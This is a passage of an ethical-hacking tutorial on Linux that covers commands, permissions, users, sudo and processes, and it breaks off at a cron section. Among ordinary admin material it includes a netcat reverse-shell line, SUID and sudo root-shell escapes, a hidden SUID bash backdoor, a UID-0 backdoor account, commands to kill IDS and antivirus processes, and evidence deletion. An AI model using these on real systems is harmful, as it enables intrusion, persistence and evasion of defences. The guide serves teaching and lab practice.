# 🐧 LINUX FOR HACKERS — THE ULTIMATE MASTER GUIDE
### From Zero to CISO | Ethical Hacking Edition

> **Legal Disclaimer:** This guide is strictly for **educational purposes** and **authorized penetration testing** only. All techniques described must only be used on systems you own or have explicit written permission to test. Unauthorized hacking is illegal and unethical.

---

**Author's Note to the Student:**
> I've written this guide as if I'm personally sitting next to you, walking you through every concept. This is not a cheat sheet — it's a mentorship document. Read every word. Practice every command. The day you become CISO of a FAANG company, come back and re-read this. You'll see how every piece connected.

---

## 📚 TABLE OF CONTENTS

1. [Why Linux for Hackers](#1-why-linux-for-hackers)
2. [Linux Fundamentals](#2-linux-fundamentals)
3. [Command Line Mastery](#3-command-line-mastery)
4. [File Permissions & Ownership](#4-file-permissions--ownership)
5. [Users & Groups Management](#5-users--groups-management)
6. [Process Management](#6-process-management)
7. [Networking in Linux](#7-networking-in-linux)
8. [File System & Storage](#8-file-system--storage)
9. [Shell Scripting for Hackers](#9-shell-scripting-for-hackers)
10. [Linux Privilege Escalation](#10-linux-privilege-escalation)
11. [Persistence Techniques on Linux](#11-persistence-techniques-on-linux)
12. [Log Management & Covering Tracks](#12-log-management--covering-tracks)
13. [Linux Hardening (CISO-Level Defense)](#13-linux-hardening-ciso-level-defense)
14. [Essential Hacking Tools Built into Linux](#14-essential-hacking-tools-built-into-linux)
15. [CTF-Specific Linux Skills](#15-ctf-specific-linux-skills)
16. [Master Linux Hacker Cheat Sheet](#master-linux-hacker-cheat-sheet)
17. [World's Best Resources](#worlds-best-resources)

---

# 1. Why Linux for Hackers

## 1.1 Why Hackers Prefer Linux Over Windows/macOS

> **Real-World Analogy:** Think of Windows as a car with the hood welded shut. macOS has a pretty hood you can *sometimes* open. Linux? You get the entire engine, blueprints, and a screwdriver. Hackers need to see everything.

### Key Reasons Linux Dominates in Hacking:

- **Open Source:** Every line of the OS can be inspected, modified, and understood. No black boxes.
- **Full Control:** You control every process, every packet, every file. Nothing runs in the background without your knowledge.
- **Tool Ecosystem:** 95% of professional security tools are written for Linux first (Metasploit, Nmap, Wireshark, Burp CLI, etc.)
- **Scripting Power:** Bash + Python + everything else creates a seamless automation pipeline
- **No Licensing Restrictions:** You can deploy on 1000 machines for free
- **Privacy:** No telemetry, no mandatory updates, no "phoning home"
- **Servers Run Linux:** When you hack a server, it's almost always Linux. You need to know your target.
- **File-Everything Philosophy:** In Linux, everything is a file — network sockets, processes, hardware. This makes manipulation predictable and scriptable.
- **Raw Socket Access:** Linux allows you to craft custom packets at the raw socket level (critical for many attacks)
- **No GUI Required:** Remote exploitation rarely has a GUI. Linux is built for the terminal.

### Why NOT Windows for Hacking?
- Registry is opaque and complex
- Antivirus constantly interferes with security tools
- Firewall/Defender blocks many scanning activities
- Limited scripting power natively
- Most tools require heavy workarounds or WSL

### Memory Tip:
> **"FOCTS"** — **F**ull control, **O**pen source, **C**ommunity tools, **T**erminal-first, **S**erver ecosystem

---

## 1.2 Most Popular Hacker Distros

> **Pro Tip:** Don't just pick a distro randomly. Each one is purpose-built. Use the right tool for the right job.

### Kali Linux
- **Best For:** Penetration testing, CTFs, learning
- **Key Features:** 600+ pre-installed security tools, rolling release, custom kernel with injection patches for wireless
- **When to Use:** Your daily driver for pentesting. Everything is pre-configured.
- **Website:** kali.org
- **Memory Tip:** "Kali = Knife drawer" — everything's already there, sharp and ready

### Parrot OS
- **Best For:** Privacy, anonymity, forensics, development
- **Key Features:** Lighter than Kali, built-in Tor/I2P, better for daily use, great for older hardware
- **When to Use:** When you need a full hacking OS but also want to browse safely and develop code
- **Memory Tip:** "Parrot = Privacy + Power"

### BlackArch Linux
- **Best For:** Advanced users, researchers, maximum toolset
- **Key Features:** 2800+ tools (most of any distro), Arch-based (rolling), highly customizable
- **When to Use:** When Kali doesn't have the tool you need. Not for beginners.
- **Memory Tip:** "BlackArch = Black belt level"

### REMnux
- **Best For:** Malware analysis, reverse engineering
- **Key Features:** Pre-configured for analyzing malware samples safely
- **When to Use:** When analyzing suspicious executables, PDFs, Office docs

### TAILS
- **Best For:** Anonymous operations, no forensic trace
- **Key Features:** Runs entirely in RAM, routes all traffic through Tor, leaves zero trace on host machine
- **When to Use:** When you need absolute anonymity (bug bounty research, whistleblowing, etc.)

### Whonix
- **Best For:** Anonymity with separation of concerns
- **Key Features:** Two VMs — Gateway (Tor) and Workstation (isolated). Even if the workstation is compromised, your real IP is safe.

---

## 1.3 Setting Up Your Hacking Lab

> **This is critical. Never hack on your host machine. Always use isolated environments.**

### Option 1: VirtualBox/VMware + Kali (Beginner)
```
Host OS → VirtualBox/VMware → Kali Linux VM
```
- Download VirtualBox (free) or VMware Workstation
- Download Kali Linux ISO from kali.org
- Allocate 4GB RAM minimum, 60GB storage
- Set network adapter to **NAT** for internet access, **Host-Only** for isolated lab

### Option 2: Full Lab Setup (Intermediate)
```
Host → Hypervisor → Multiple VMs:
  - Kali Linux (attacker)
  - Metasploitable 2/3 (vulnerable target)
  - DVWA on Ubuntu (web target)
  - Windows 10/Server (Windows target)
```

### Option 3: Cloud Lab (Advanced)
- Use **Hack The Box**, **TryHackMe**, or **PentesterLab** — cloud-based vulnerable machines
- No local hardware needed
- Great for practicing without legal risk

### Network Modes Explained:
| Mode | Internet | Talks to VMs | Talks to Host | Use Case |
|------|----------|-------------|--------------|----------|
| NAT | ✅ | ❌ | ❌ | Updating packages |
| Bridged | ✅ | ✅ | ✅ | Realistic lab |
| Host-Only | ❌ | ✅ | ✅ | Isolated hacking lab |
| Internal | ❌ | ✅ | ❌ | Fully isolated network |

> **Pro Hacker Tip 🔥:** Set up a snapshot of your Kali VM right after installation and tool setup. Before any major operation, snapshot again. This lets you rollback instantly if something breaks.

### How to Practice This Section:
- [ ] Install VirtualBox on your host machine
- [ ] Download and install Kali Linux as a VM
- [ ] Download Metasploitable 2 and add it as a second VM
- [ ] Set both VMs to Host-Only adapter
- [ ] Verify you can ping Metasploitable from Kali
- [ ] Take a snapshot of both VMs

---

# 2. Linux Fundamentals

## 2.1 Linux Architecture (The Foundation)

> **Analogy:** Think of Linux like a company. The **Kernel** is the CEO making all hardware decisions. The **Shell** is the receptionist who takes your requests. **Applications** are the employees doing actual work. The **File System** is the office building where everything is stored.

### Layers from Bottom to Top:

```
┌────────────────────────────────┐
│         User Applications      │  ← Tools you run (Nmap, Python, etc.)
├────────────────────────────────┤
│            Shell               │  ← Bash, Zsh, Fish — your interface
├────────────────────────────────┤
│         System Calls           │  ← Bridge between user space & kernel
├────────────────────────────────┤
│            Kernel              │  ← Core OS: manages CPU, RAM, devices
├────────────────────────────────┤
│            Hardware            │  ← CPU, RAM, Disk, Network Card
└────────────────────────────────┘
```

### The Kernel — What Hackers Need to Know:
- Manages all hardware resources
- Controls process scheduling
- Handles memory allocation
- **Kernel exploits** are the most powerful attacks (DirtyCOW, OverlayFS, etc.)
- Version: check with `uname -r` — older kernels have more known exploits
- Located at `/boot/vmlinuz-[version]`

### The Shell — What Hackers Live In:
- **Bash (Bourne Again Shell):** Default on most distros. Your main weapon.
- **Zsh:** More features, used in Kali by default now
- **Fish:** Beginner friendly but less used in hacking
- **sh:** POSIX compliant, portable, used in scripts

```bash
# Check which shell you're using
echo $SHELL
# or
cat /etc/shells   # All available shells
```

---

## 2.2 Linux Directory Structure — The Hacker's Map

> **This is your treasure map.** As a hacker on a compromised system, knowing WHERE things are is the difference between finding credentials in 30 seconds vs. never finding them.

```
/
├── bin/       → Essential user binaries (ls, cp, mv, cat)
├── sbin/      → System admin binaries (iptables, fdisk, ifconfig)
├── etc/       → Configuration files ← GOLD MINE FOR HACKERS
├── home/      → User home directories ← Look for SSH keys, bash history
├── root/      → Root user's home ← The ultimate prize
├── var/       → Variable data (logs, mail, databases)
├── tmp/       → Temporary files ← World-writable! Perfect for dropping payloads
├── usr/       → User programs and data
├── lib/       → Shared libraries (like DLLs on Windows)
├── proc/      → Virtual filesystem for running processes ← Hacker goldmine
├── sys/       → Virtual filesystem for kernel/hardware info
├── dev/       → Device files
├── mnt/       → Mount points for external drives
├── opt/       → Optional/third-party software
├── boot/      → Bootloader and kernel images
└── srv/       → Service data (web files, FTP files)
```

### Hacker's Priority Directories:

| Directory | Why Hackers Care | What to Look For |
|-----------|-----------------|------------------|
| `/etc/passwd` | User accounts list | Usernames, UIDs, shell types |
| `/etc/shadow` | Password hashes | Crack offline with Hashcat/John |
| `/etc/sudoers` | Sudo permissions | Misconfigs for privesc |
| `/home/user/.ssh/` | SSH keys | Private keys for lateral movement |
| `/home/user/.bash_history` | Command history | Passwords typed in commands! |
| `/var/log/` | System logs | Evidence of activity, credentials in logs |
| `/tmp/` | World-writable | Drop exploits, create sockets |
| `/proc/[PID]/` | Process memory | Dump credentials from running processes |
| `/root/` | Root's home | Flags in CTFs, credentials in real life |
| `/opt/` | Custom software | Misconfigured third-party apps |

---

## 2.3 File Types in Linux

> **Everything is a file in Linux** — this is one of the most important concepts to internalize.

### File Type Identifiers (from `ls -la`):

| Symbol | Type | Example | Hacker Relevance |
|--------|------|---------|-----------------|
| `-` | Regular file | `/etc/passwd` | Most files |
| `d` | Directory | `/home/user/` | Navigation |
| `l` | Symbolic link | `/usr/bin/python` → `python3` | Symlink attacks |
| `c` | Character device | `/dev/tty` | Terminal manipulation |
| `b` | Block device | `/dev/sda` | Disk access |
| `s` | Socket | `/tmp/.s.mysql` | IPC communication |
| `p` | Named pipe (FIFO) | `/tmp/pipe` | Interprocess comms |

```bash
# Check file type
file /etc/passwd
ls -la /etc/passwd

# Find all SUID files (huge for privesc!)
find / -perm -4000 2>/dev/null
```

---

## 2.4 Package Managers

> **As a hacker, you'll constantly install tools. Know your package manager.**

### APT (Debian/Ubuntu/Kali) — Most Common:
```bash
apt update                        # Update package lists
apt upgrade                       # Upgrade installed packages
apt install nmap                  # Install a package
apt remove nmap                   # Remove a package
apt search nmap                   # Search for packages
apt show nmap                     # Show package details
apt list --installed              # List installed packages
```

### YUM/DNF (CentOS/Fedora/RHEL):
```bash
yum install nmap
dnf install nmap                  # Modern replacement for yum
```

### Pacman (Arch/BlackArch):
```bash
pacman -S nmap                    # Install
pacman -Syu                       # Update everything
pacman -Ss nmap                   # Search
```

### Pip (Python packages — critical for hacking tools):
```bash
pip install impacket              # Install Python package
pip3 install impacket             # Python 3 version
pip install -r requirements.txt   # Install from requirements file
```

> **Pro Hacker Tip 🔥:** On a compromised system without internet access, you can install packages from `.deb` files: `dpkg -i package.deb`. Always carry important tools in a package format.

### How to Practice This Section:
- [ ] Open terminal in Kali and run `apt update && apt upgrade`
- [ ] Navigate through each directory in `/` using `ls -la`
- [ ] Run `find / -perm -4000 2>/dev/null` and look at the output
- [ ] Check `cat /etc/passwd` and understand each field
- [ ] Use `file` command on 10 different files

---

# 3. Command Line Mastery

> **The terminal is your weapon. Master it completely. A hacker who can't navigate Linux quickly is like a surgeon who can't use a scalpel.**

## 3.1 Navigation Commands

### The Absolute Basics — With Hacker Context:

```bash
pwd                    # Print Working Directory — WHERE AM I?
                       # Hacker use: Confirm your location after dropping into a shell

ls                     # List directory contents
ls -la                 # Long format + hidden files (the -a flag reveals .hidden files)
ls -lah                # Add human-readable file sizes
ls -lat                # Sort by modification time (newest first — great for finding recent files)
ls -laR                # Recursive listing — see everything in subdirectories
                       # Hacker use: ls -lat /home/user/ to see recently modified files

cd /etc                # Change directory to /etc
cd ~                   # Go to home directory
cd -                   # Go back to PREVIOUS directory (underused but very useful!)
cd ..                  # Go up one level
cd ../../../           # Go up three levels

tree                   # Visual directory tree (install: apt install tree)
tree -a                # Include hidden files
tree -L 2              # Only show 2 levels deep
                       # Hacker use: tree /etc/ to map configuration structure quickly
```

### Finding Your Bearings on a Compromised System:
```bash
# First commands you run after gaining shell access
id                     # Who am I? (UID, GID, groups)
whoami                 # Just the username
hostname               # What machine am I on?
uname -a               # Kernel version + OS details
cat /etc/os-release    # Exact OS version
cat /proc/version      # Alternative kernel version info
env                    # Environment variables (look for credentials!)
echo $PATH             # PATH variable (useful for PATH hijacking privesc)
```

---

## 3.2 File Operations

### Reading Files:
```bash
cat /etc/passwd               # Display entire file
cat -n /etc/passwd            # With line numbers
less /var/log/syslog          # Page through large file (q to quit, / to search)
more /var/log/auth.log        # Older pager (less is better)
head -n 20 /var/log/auth.log  # First 20 lines
tail -n 20 /var/log/auth.log  # Last 20 lines
tail -f /var/log/auth.log     # FOLLOW the log in real-time ← Watch for auth attempts live!

# Read specific lines
sed -n '10,20p' /etc/passwd   # Print lines 10-20
awk 'NR>=10 && NR<=20' /etc/passwd
```

### Searching Inside Files:
```bash
grep "password" /etc/config               # Search for "password" in file
grep -r "password" /var/www/              # Recursive search (search all files in dir)
grep -i "password" /etc/config            # Case-insensitive
grep -n "password" /etc/config            # Show line numbers
grep -v "comment" /etc/config             # Show lines NOT matching
grep -E "pass|secret|key" /etc/config     # Extended regex (search multiple patterns)

# Hacker one-liner: Find credentials in all config files
grep -r -i "password\|passwd\|secret\|api_key\|token" /var/www/ 2>/dev/null
```

### Creating and Writing Files:
```bash
touch newfile.txt              # Create empty file (also updates timestamp)
echo "hello" > file.txt        # Write (OVERWRITE) to file
echo "world" >> file.txt       # APPEND to file
cat > file.txt << EOF          # Write multiline content
line one
line two
EOF

# Quick script creation
echo '#!/bin/bash' > exploit.sh
echo 'nc -e /bin/bash 10.0.0.1 4444' >> exploit.sh
chmod +x exploit.sh
```

### Copying, Moving, Deleting:
```bash
cp source.txt dest.txt         # Copy file
cp -r /source/dir /dest/dir    # Copy directory recursively
mv old.txt new.txt             # Move or rename
mv /tmp/shell /var/www/html/   # Move to web directory (common in attacks)
rm file.txt                    # Delete file
rm -rf /tmp/evidence/          # Delete directory recursively ← Covering tracks
ln -s /etc/passwd /tmp/passwd  # Create symbolic link (symlink attacks)
```

### Finding Files — Critical for Hackers:
```bash
find / -name "*.conf" 2>/dev/null               # Find all .conf files
find / -name "config.php" 2>/dev/null           # Find PHP config files
find / -perm -4000 2>/dev/null                  # Find SUID files (privesc!)
find / -perm -2000 2>/dev/null                  # Find SGID files
find / -writable 2>/dev/null                    # Find writable files/directories
find / -writable -type d 2>/dev/null            # Find writable directories
find / -user root -perm -4000 2>/dev/null       # SUID files owned by root
find / -mtime -1 2>/dev/null                    # Files modified in last 24 hours
find / -size +100M 2>/dev/null                  # Find large files (could be databases)
find /home -name ".bash_history" 2>/dev/null    # Find all bash histories
find / -name "*.txt" -exec grep -l "password" {} \; # Find txt files containing "password"

# locate — faster but uses cached database
locate passwd
updatedb                                        # Update the locate database
```

---

## 3.3 Text Editors — The Survival Guide

### Nano (Beginner Friendly):
```bash
nano file.txt          # Open file
# CTRL+O → Save
# CTRL+X → Exit
# CTRL+W → Search
# CTRL+K → Cut line
# CTRL+U → Paste
```

### Vim (The Professional's Editor — Learn It!):
```bash
vim file.txt           # Open file

# VIM MODES:
# Normal Mode → Default. For navigation and commands
# Insert Mode → Press 'i' to enter. Type your content.
# Command Mode → Press ':' in Normal mode for commands

# ESSENTIAL VIM COMMANDS:
# i          → Enter Insert mode (before cursor)
# a          → Enter Insert mode (after cursor)
# ESC        → Return to Normal mode
# :w         → Save
# :q         → Quit
# :wq        → Save and quit
# :q!        → Quit without saving (FORCE quit)
# :wq!       → Force save and quit

# NAVIGATION (Normal mode):
# h,j,k,l   → Left, Down, Up, Right
# gg         → Go to first line
# G          → Go to last line
# :50        → Go to line 50
# /pattern   → Search forward
# n          → Next search result

# EDITING:
# dd         → Delete entire line
# yy         → Copy (yank) line
# p          → Paste
# u          → Undo
# CTRL+R     → Redo
# :%s/old/new/g  → Find and replace ALL occurrences

# HACKER USE CASE:
# Quickly edit /etc/hosts to add a target IP
# sudo vim /etc/hosts → add "10.10.10.1 target.htb"
```

> **Memory Tip for Vim:** "**IESC:WQ**" — Insert, Escape, Colon, Write, Quit. The Vim survival sequence.

---

## 3.4 Input/Output Redirection & Piping

> **This is CRITICAL for hacking. Chaining tools together with pipes is how you build powerful one-liners.**

### The Three Streams:
```
STDIN  (0) → Input  → keyboard by default
STDOUT (1) → Output → screen by default
STDERR (2) → Errors → screen by default
```

### Redirection:
```bash
command > file.txt         # Redirect STDOUT to file (overwrite)
command >> file.txt        # Redirect STDOUT to file (append)
command 2> errors.txt      # Redirect STDERR to file
command 2>/dev/null        # Discard errors ← Used constantly in hacking
command &> all.txt         # Redirect both STDOUT and STDERR
command < input.txt        # Use file as STDIN
command 2>&1               # Redirect STDERR to STDOUT

# Real-world examples:
nmap -sV 10.0.0.0/24 > scan_results.txt 2>/dev/null   # Save scan, discard errors
find / -perm -4000 2>/dev/null > suid_files.txt        # Save SUID findings
```

### Piping — Chaining Commands:
```bash
# Pipe (|) takes STDOUT of left command → STDIN of right command

ls -la | grep ".conf"                   # List files, filter for .conf
cat /etc/passwd | cut -d: -f1           # Extract just usernames
cat /etc/passwd | awk -F: '{print $1}'  # Same with awk
ps aux | grep root                      # Find root processes
cat /var/log/auth.log | grep "Failed"   # Find failed login attempts
cat users.txt | sort | uniq             # Sort and remove duplicates
cat /etc/passwd | wc -l                 # Count users

# Multi-pipe chaining:
cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn
# ↑ This extracts IPs with most failed SSH login attempts — defenders use this!
```

### Tee — Write AND Display:
```bash
nmap -sV 10.0.0.1 | tee scan.txt       # Shows output AND saves to file
```

### xargs — Convert Output to Arguments:
```bash
cat targets.txt | xargs nmap -sV        # Run nmap on each IP in file
find / -name "*.php" | xargs grep -l "password"  # Search all PHP files
```

---

## 3.5 Wildcards and Globbing

```bash
*          # Any number of any characters
?          # Exactly ONE character
[abc]      # Any one of: a, b, or c
[a-z]      # Any lowercase letter
[0-9]      # Any digit
{a,b,c}    # Brace expansion

# Examples:
ls *.txt                    # All .txt files
ls /etc/*.conf              # All .conf files in /etc
cat /home/*/.bash_history   # ALL users' bash histories ← Hacker move!
rm -rf /tmp/exploit*        # Delete all files starting with "exploit"
find / -name "config.[ch]"  # Files named config.c or config.h
```

### How to Practice This Section:
- [ ] Navigate through the entire Linux filesystem using `cd` and `ls`
- [ ] Create a file, write to it with echo, read it with cat, search it with grep
- [ ] Practice piping: `cat /etc/passwd | cut -d: -f1,3,7 | sort`
- [ ] Find all SUID files on your system: `find / -perm -4000 2>/dev/null`
- [ ] Open Vim, write 5 lines, save and quit using `:wq`
- [ ] Check all users' bash histories: `cat /home/*/.bash_history 2>/dev/null`

---

# 4. File Permissions & Ownership

> **Understanding permissions is the KEY to privilege escalation. Almost every Linux privesc attack involves misconfigured permissions.**

## 4.1 The Permission Model

### Reading Permissions:
```bash
ls -la /etc/passwd
# -rw-r--r-- 1 root root 1872 Jan 15 10:23 /etc/passwd
#  ↑          ↑ ↑    ↑
#  Perms     Links Owner Group
```

### Breaking Down Permission Bits:
```
- r w x r - x r - -
  ↑ ↑ ↑ ↑   ↑ ↑   ↑
  │ │ │ │   │ │   └── Others: read only
  │ │ │ └───┘ └────── Group: read + execute
  │ └─┘ └──────────── Owner: read + write
  └── File type (- = regular, d = dir, l = link)
```

### Permission Values (Octal):
| Permission | Binary | Octal |
|------------|--------|-------|
| `---` | 000 | 0 |
| `--x` | 001 | 1 |
| `-w-` | 010 | 2 |
| `-wx` | 011 | 3 |
| `r--` | 100 | 4 |
| `r-x` | 101 | 5 |
| `rw-` | 110 | 6 |
| `rwx` | 111 | 7 |

> **Memory Tip:** 4=Read, 2=Write, 1=eXecute. **"R(4)ead, W(2)rite, e(1)Xecute"** — 421 421 421

---

## 4.2 chmod — Changing Permissions

```bash
# Symbolic method:
chmod u+x file          # Add execute to user (owner)
chmod g-w file          # Remove write from group
chmod o+r file          # Add read to others
chmod a+x file          # Add execute to ALL (user, group, others)
chmod u+x,g-w file      # Multiple changes at once

# Octal method (faster, preferred by hackers):
chmod 777 file          # rwxrwxrwx — Everyone can do everything ← DANGEROUS
chmod 755 file          # rwxr-xr-x — Owner full, others read+exec
chmod 644 file          # rw-r--r-- — Owner read/write, others read only
chmod 600 file          # rw------- — Owner only (SSH private keys MUST be this!)
chmod 700 directory     # rwx------ — Only owner can enter

# Real-world examples:
chmod 600 ~/.ssh/id_rsa         # Fix SSH key permissions
chmod +x exploit.sh             # Make exploit executable
chmod 777 /tmp/reverse_shell    # Allow anyone to execute payload
```

---

## 4.3 chown & chgrp — Changing Ownership

```bash
chown user file.txt              # Change owner
chown user:group file.txt        # Change owner AND group
chown -R user:group /directory   # Recursive (all files inside too)
chgrp group file.txt             # Change only group

# Hacker scenario:
# After privilege escalation, you might do:
chown root:root /tmp/backdoor    # Make backdoor look like system file
chmod 4755 /tmp/backdoor         # Set SUID on it
```

---

## 4.4 SUID, SGID, Sticky Bit — The Holy Grail of Privesc

> **This section alone has helped me compromise hundreds of machines. Understand it deeply.**

### SUID (Set User ID) — Bit Value: 4000
```bash
# When SUID is set on an executable:
# The program runs with the PERMISSIONS OF THE FILE OWNER
# Not the person who runs it!

# Example: /bin/passwd is SUID root
ls -la /bin/passwd
# -rwsr-xr-x 1 root root ... /bin/passwd
#      ↑
#      's' instead of 'x' = SUID is set

# This is why regular users can change their own password
# passwd runs as ROOT to write to /etc/shadow

# How hackers abuse it:
find / -user root -perm -4000 2>/dev/null    # Find all SUID files owned by root
```

### Classic SUID Exploits:
```bash
# If /bin/bash has SUID set (misconfiguration):
/bin/bash -p           # -p preserves EUID = get root shell!

# If vim has SUID:
vim -c ':!id'          # Execute commands as root from within vim

# If find has SUID:
find . -exec /bin/sh -p \; -quit    # Get root shell

# GTFOBins — the bible for SUID exploitation
# https://gtfobins.github.io
```

### SGID (Set Group ID) — Bit Value: 2000
```bash
# For files: runs with file's GROUP permissions
# For directories: new files inherit the directory's GROUP

# Find SGID files:
find / -perm -2000 2>/dev/null

# If /usr/bin/newgrp has SGID:
# Check GTFOBins for exploitation method
```

### Sticky Bit — Bit Value: 1000
```bash
# Set on directories:
# Users can only delete their OWN files even if directory is world-writable

ls -la /tmp
# drwxrwxrwt  ← 't' at the end = sticky bit on /tmp

# Without sticky bit on /tmp → anyone could delete anyone's files!
# Hackers look for world-writable directories WITHOUT sticky bit:
find / -type d -perm -0002 ! -perm -1000 2>/dev/null
```

### Setting Special Bits:
```bash
chmod u+s file         # Set SUID
chmod g+s file         # Set SGID
chmod +t directory     # Set sticky bit

# Octal:
chmod 4755 file        # SUID + rwxr-xr-x
chmod 2755 file        # SGID + rwxr-xr-x
chmod 1777 /tmp        # Sticky + rwxrwxrwx
```

> **Pro Hacker Tip 🔥:** After compromising a system and getting root, you can create a backdoor: `cp /bin/bash /tmp/.hidden_bash && chmod 4755 /tmp/.hidden_bash`. Now any user can run `/tmp/.hidden_bash -p` to get a root shell. This is a real persistence technique.

### How to Practice This Section:
- [ ] Run `find / -perm -4000 2>/dev/null` on Metasploitable. Compare the SUID files.
- [ ] Look up each SUID binary on GTFOBins (gtfobins.github.io)
- [ ] Create a test file, experiment with chmod using both symbolic and octal methods
- [ ] Check if `/bin/bash` or `vim` on Metasploitable has SUID set and try exploiting it

---

# 5. Users & Groups Management

## 5.1 The Critical Files — Hacker's Database

### /etc/passwd — The User Database:
```bash
cat /etc/passwd

# Format:
# username:password:UID:GID:comment:home_directory:shell
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# user:x:1000:1000:,,,:/home/user:/bin/bash

# Field breakdown:
# 1. username
# 2. password → 'x' means hash is in /etc/shadow; if NOT 'x' = password hash here (old systems!)
# 3. UID → 0 = root. UIDs < 1000 usually = system accounts
# 4. GID → Primary group ID
# 5. GECOS → Comment/full name (often empty)
# 6. Home dir → Where user's files are
# 7. Shell → /bin/bash = interactive; /sbin/nologin or /bin/false = can't login

# Hacker extractions:
cat /etc/passwd | cut -d: -f1            # Get all usernames
cat /etc/passwd | awk -F: '$3==0'        # Find UID 0 accounts (ALL root-equivalent!)
cat /etc/passwd | awk -F: '$7 ~ /bash/'  # Find accounts with bash shells
```

### /etc/shadow — The Password Hash File:
```bash
# Only readable by root!
sudo cat /etc/shadow

# Format:
# username:$hash_type$salt$hash:last_change:min:max:warn:inactive:expire
# root:$6$salt$hashhashHash...:18000:0:99999:7:::
# user:$6$xyz$abc123...:18000:0:99999:7:::

# Hash Types:
# $1$ = MD5 (weak, crackable fast)
# $2y$ = bcrypt (strong)
# $5$ = SHA-256
# $6$ = SHA-512 (current standard)
# * or ! = account locked

# Hacker workflow after getting shadow:
# 1. Copy hashes to your attack machine
# 2. Run hashcat: hashcat -m 1800 hashes.txt wordlist.txt
# 3. Or John: john --wordlist=rockyou.txt hashes.txt
```

### /etc/group — Group Membership:
```bash
cat /etc/group
# Format: groupname:password:GID:members
# sudo:x:27:user1,user2    ← Members of sudo group = can run sudo!
# docker:x:999:user        ← In docker group = potential root privesc!
# adm:x:4:syslog,user      ← Can read logs

# Critical groups to look for:
cat /etc/group | grep -E "sudo|wheel|docker|lxd|disk|adm"
```

---

## 5.2 User Management Commands

```bash
# Creating users:
useradd newuser                        # Create user (minimal)
useradd -m -s /bin/bash newuser        # Create with home dir and bash shell
useradd -m -s /bin/bash -G sudo newuser # Create + add to sudo group!
adduser newuser                        # Interactive (Debian/Ubuntu)

# Setting passwords:
passwd newuser                         # Set password interactively
echo "newuser:password123" | chpasswd  # Set password non-interactively ← Scripting!

# Backdoor creation (post-exploitation):
useradd -m -s /bin/bash -u 0 -g 0 backdoor  # Create user with UID 0 = root!
echo "backdoor:backdoor123" | chpasswd

# Modifying users:
usermod -aG sudo existinguser          # Add to sudo group (-a = append, important!)
usermod -s /bin/bash existinguser      # Change shell
usermod -L username                    # Lock account
usermod -U username                    # Unlock account

# Deleting users:
userdel username                       # Delete user
userdel -r username                    # Delete user + home directory
```

---

## 5.3 su and sudo — Privilege Escalation Entry Points

### su — Switch User:
```bash
su                     # Switch to root (need root password)
su -                   # Switch to root + load root's environment (important!)
su username            # Switch to specific user
su - username          # Switch with that user's environment

# The difference: 'su' vs 'su -'
su                     # Keeps your current environment (PATH, etc.)
su -                   # Full login shell — loads /etc/profile, .bashrc, etc.
                       # ALWAYS use 'su -' to get complete root environment
```

### sudo — The Hacker's Primary Target:
```bash
sudo command           # Run as root
sudo -l                # ← LIST what you can run with sudo. CRITICAL for privesc!
sudo -u user command   # Run as a different user
sudo su -              # Get root shell if you're in sudoers
sudo -i                # Interactive root shell

# /etc/sudoers misconfigurations (the gold mine):
# Check with: sudo -l

# If you see: (ALL:ALL) NOPASSWD: ALL → Full root access without password!
# If you see: user ALL=(ALL) NOPASSWD: /usr/bin/python3
#   → You can run python3 as root: sudo python3 -c "import os; os.system('/bin/bash')"
# If you see: user ALL=(ALL) NOPASSWD: /usr/bin/vim
#   → sudo vim -c ':!bash'  ← Shell as root!
# If you see: user ALL=(ALL) NOPASSWD: /usr/bin/find
#   → sudo find . -exec /bin/bash \;  ← Root shell!

# GTFOBins has exploits for EVERY common binary
```

> **Real-World Story:** In a real penetration test, I found that a web server user (`www-data`) could run `/usr/bin/python3` with sudo without a password. Thirty seconds later I had a root shell. This is why `sudo -l` is always in the first five commands you run after getting a foothold.

### How to Practice This Section:
- [ ] Study `/etc/passwd`, `/etc/shadow`, `/etc/group` on your Kali VM
- [ ] Create a test user: `useradd -m testuser` and set a password
- [ ] Run `sudo -l` and understand what each line means
- [ ] On Metasploitable: find misconfigured sudo entries
- [ ] Practice cracking shadow hashes with John the Ripper

---

# 6. Process Management

## 6.1 Viewing Processes

```bash
ps                      # Processes for current terminal
ps aux                  # ALL processes, detailed (a=all users, u=user-oriented, x=no terminal)
ps aux | grep root      # Root processes
ps aux | grep -v root   # Non-root processes
ps -ef                  # Full format listing
ps -ef --forest         # Show process TREE (parent-child relationships!)

# Output columns of ps aux:
# USER   PID  %CPU  %MEM  VSZ   RSS  TTY  STAT  START  TIME  COMMAND
# root   1234  0.0   0.1  1234  567  pts/0  S    10:00  0:00  /usr/sbin/sshd

# STAT codes:
# R = Running
# S = Sleeping (interruptible)
# D = Sleeping (uninterruptible — usually I/O)
# Z = Zombie (dead but not reaped)
# T = Stopped
# < = High priority
# N = Low priority
```

### top / htop — Real-Time Process Monitor:
```bash
top                     # Real-time process viewer
htop                    # Better version (install: apt install htop)

# top keyboard shortcuts:
# k → Kill process (enter PID)
# u → Filter by user
# M → Sort by memory
# P → Sort by CPU
# q → Quit

# htop is much more user-friendly with mouse support
```

---

## 6.2 Managing Processes

```bash
kill PID                # Send SIGTERM (graceful terminate)
kill -9 PID             # Send SIGKILL (force kill — can't be ignored)
kill -15 PID            # Send SIGTERM explicitly
killall processname     # Kill by name
pkill -u username       # Kill all processes by user

# Signals reference:
# 1  = SIGHUP  → Reload config
# 2  = SIGINT  → Interrupt (Ctrl+C)
# 9  = SIGKILL → Force kill (cannot be caught or ignored)
# 15 = SIGTERM → Polite terminate
# 19 = SIGSTOP → Pause process

# Hacker use: Kill IDS/antivirus process (if root):
# First find it:
ps aux | grep -i "snort\|suricata\|aide\|tripwire\|clamd"
# Then kill it:
kill -9 PID_of_AV
```

---

## 6.3 Background and Foreground Jobs

```bash
command &               # Run in background from start
CTRL+Z                  # Suspend foreground job (pause it)
bg                      # Send suspended job to background
fg                      # Bring background job to foreground
fg %2                   # Bring job #2 to foreground
jobs                    # List all background jobs

# Real-world use:
nmap -sV -p- 10.0.0.1 &       # Long scan in background
python3 -m http.server 8080 &  # Start web server in background
nc -lvnp 4444 &               # Listener in background
```

### nohup — Survive Logout:
```bash
nohup command &               # Run command, survive after logout
nohup ./long_script.sh &      # Output goes to nohup.out
disown %1                     # Disown background job (detach from terminal)
```

---

## 6.4 Cron Jobs — Scheduling & Hacker Abuse

> **Cron jobs are one of the most common persistence mechanisms and privilege escalation vectors.**

### How Cron Works:
```bash
